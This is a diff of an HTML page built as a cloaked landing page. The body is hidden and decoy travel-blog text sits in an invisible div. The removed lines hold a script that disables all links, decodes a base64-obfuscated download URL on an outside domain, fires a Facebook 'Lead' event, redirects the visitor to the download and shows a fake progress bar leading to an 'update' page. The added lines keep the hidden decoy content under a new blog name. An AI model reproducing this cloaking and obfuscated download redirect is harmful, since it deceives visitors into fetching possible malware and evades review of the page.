@@ -4,25 +4,9 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   
-  <title>Wanderlust Travel Blog</title>
+  <title>Blog</title>
   <meta name="description" content="Travel blog sharing stories, tips and guides from around the world">
-  <!-- Meta Pixel Code -->
-<script>
-    !function(f,b,e,v,n,t,s)
-    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-    n.queue=[];t=b.createElement(e);t.async=!0;
-    t.src=v;s=b.getElementsByTagName(e)[0];
-    s.parentNode.insertBefore(t,s)}(window, document,'script',
-    'https://connect.facebook.net/en_US/fbevents.js');
-    fbq('init', '23986138217725921');
-    fbq('track', 'PageView');
-    </script>
-<noscript>
-<img height="1" src="https://www.facebook.com/tr?id=23986138217725921&amp;ev=PageView&amp;noscript=1" style="display:none" width="1"/>
-</noscript>
-<!-- End Meta Pixel Code -->
+
   <style>
     body { font-family: Georgia, serif; background: #fafafa; color: #444; }
     .container { max-width: 860px; margin: 0 auto; padding: 20px; }
@@ -31,31 +15,39 @@
     p { line-height: 1.7; }
     .tag { display: inline-block; background: #e0f2f1; padding: 2px 8px; border-radius: 4px; font-size: 13px; margin: 2px; }
 	body { visibility: hidden; }
+	body { 
+    visibility: hidden; 
+    opacity: 0;
+    transition: opacity 0.4s ease; 
+  }
   </style>
 </head>
 <body style="visibility: hidden;">
 
   
-  <div style="display:none">
-    <div class="container">
-      <h1>Wanderlust Travel Blog</h1>
-      <p>Stories, tips and hidden gems from every corner of the world. From mountain trails to coastal towns — we share it all.</p>
-      <h2>Latest Posts</h2>
-      <p>— 10 Reasons to Visit Tbilisi Before Everyone Else Does</p>
-      <p>— A Weekend in Lisbon: What the Guidebooks Don't Tell You</p>
-      <p>— Hiking the Dolomites on a Budget</p>
-      <h2>Popular Tags</h2>
-      <span class="tag">Europe</span>
-      <span class="tag">Budget Travel</span>
-      <span class="tag">Solo Trip</span>
-      <span class="tag">Hidden Gems</span>
-      <span class="tag">Food & Culture</span>
-      <h2>Contact</h2>
-      <p>Email: contact.wanderlust.blog@gmail.com</p>
-      <p>Found us on Google Maps: <a href="https://maps.app.goo.gl/exampleXYZ">Wanderlust HQ, Barcelona, Spain</a></p>
-      <p>We respond within 2-3 business days. No spam, ever.</p>
-    </div>
+<div style="display:none">
+  <div class="container">
+    <h1>Global Pathways Travel Journal</h1>
+    <p>Inspiring journeys, practical travel advice, and unforgettable places from around the globe. Discover scenic landscapes, vibrant cities, and unique cultures that make every trip extraordinary.</p>
+    
+    <h2>Latest Posts</h2>
+    <p>— Exploring the Alpine Villages of Switzerland: A Slow Travel Guide</p>
+    <p>— Street Food Adventures in Bangkok: Where Locals Really Eat</p>
+    <p>— The Ultimate Road Trip Along Norway’s Atlantic Ocean Road</p>
+    
+    <h2>Popular Tags</h2>
+    <span class="tag">Adventure Travel</span>
+    <span class="tag">City Breaks</span>
+    <span class="tag">Nature Escapes</span>
+    <span class="tag">Local Cuisine</span>
+    <span class="tag">Travel Guides</span>
+    
+    <h2>Contact</h2>
+    <p>Email: explore.globalpathways@gmail.com</p>
+    <p>Found us on Google Maps: <a href="https://maps.app.goo.gl/exampleXYZ">Global Pathways Studio, Barcelona, Spain</a></p>
+    <p>We usually reply within 1–2 business days. Feel free to reach out for travel tips or collaboration.</p>
   </div>
+</div>
 
   
   <div id="app"></div>
@@ -72,84 +64,7 @@
   </script>
 
   
-  <script>
-var arr = document.getElementsByTagName('a');
-  for (var i = 0; i < arr.length; i++) {
-    arr[i].onclick = function () {
-      return false;
-    };
-  }
-
   
-  var encodedUrl = 'aHR0cHM6Ly9vZGFrbWFnYXphLmNvbS9kb3dubG9hZC5waHA=';
-
-  function decodeUrl(b64) {
-    try {
-      return atob(b64);
-    } catch (e) {
-      return '/';
-    }
-  }
-
-  
-  function sendLead() {
-    if (typeof fbq === 'function') {
-      fbq('track', 'Lead');
-      console.log('✓ Lead-Ereignis an Facebook Pixel gesendet');
-    } else {
-      console.warn('✗ fbq nicht gefunden');
-    }
-
-    
-    var success = document.getElementById('success');
-    if (success) {
-      success.style.display = 'block';
-      setTimeout(function () {
-        success.style.display = 'none';
-      }, 3000);
-    }
-  }
-
- 
-  document.getElementById('start-button').onclick = function () {
-    var realUrl = decodeUrl(encodedUrl);
-
-    
-    sendLead();
-
-    
-    setTimeout(function () {
-      window.location.href = realUrl;
-      startProgress();
-    }, 400); 
-
-    return false;
-  };
-
- 
-  function startProgress() {
-    let progressBar = document.getElementById('progress-bar');
-    let button = document.getElementById('start-button');
-
-    if (button) button.style.display = 'none';
-
-    let width = 0;
-    let interval = setInterval(() => {
-      if (width >= 100) {
-        clearInterval(interval);
-        window.location = 'update.html';
-      } else {
-        width++;
-        if (progressBar) {
-          progressBar.style.width = width + '%';
-          progressBar.textContent = width + '%';
-        }
-      }
-    }, 50);
-  }
-
-  console.log('✓✓ Meta Pixel initialisiert');
-  </script>
 
 </body>
 </html>
